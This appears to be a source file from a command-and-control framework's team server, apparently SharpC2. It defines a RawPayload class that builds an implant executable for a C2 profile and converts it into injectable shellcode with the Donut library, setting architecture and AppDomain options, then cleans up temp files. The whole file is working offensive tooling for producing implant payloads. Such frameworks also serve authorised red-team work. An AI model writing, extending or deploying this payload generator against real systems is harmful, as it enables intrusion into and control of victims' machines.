using System;
using System.IO;
using System.Threading.Tasks;

using Donut;
using Donut.Structs;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public class RawPayload : Payload
    {
        private string _tempDroneFile;
        private string _tempShellcodeFile;
        
        public RawPayload(Handler handler, C2Profile c2Profile, string cryptoKey) : base(handler, c2Profile, cryptoKey)
        { }
        
        public override async Task Generate()
        {
            // generate an exe
            var exe = new ExePayload(Handler, C2Profile, CryptoKey);
            await exe.Generate();

            _tempShellcodeFile = Path.GetTempFileName().Replace(".tmp", ".bin");
            _tempDroneFile = Path.GetTempFileName().Replace(".tmp", ".exe");
            await File.WriteAllBytesAsync(_tempDroneFile, exe.Bytes);

            var appDomain = C2Profile.PostExploitation.AppDomain;
            
            if (string.IsNullOrEmpty(appDomain))
                appDomain = "SharpC2";
            else if (appDomain.Equals("random", StringComparison.OrdinalIgnoreCase))
                appDomain = Guid.NewGuid().ToShortGuid();

            var config = new DonutConfig
            {
                Arch = 3, // x86+amd64
                Bypass = 1, // none
                Domain = appDomain,
                InputFile = _tempDroneFile,
                Payload = _tempShellcodeFile
            };

            var result = Generator.Donut_Create(ref config);
            if (result != Constants.DONUT_ERROR_SUCCESS)
            {
                DeleteTempFiles();
                throw new Exception("Error generating shellcode");
            }

            Bytes = await File.ReadAllBytesAsync(_tempShellcodeFile);
            
            DeleteTempFiles();
        }

        private void DeleteTempFiles()
        {
            try { File.Delete(_tempShellcodeFile); } catch { /* ignore */ }
            try { File.Delete(_tempDroneFile); } catch { /* ignore */ }
            try { File.Delete($"{_tempShellcodeFile}.b64"); } catch { /* ignore */ }
        }
    }
}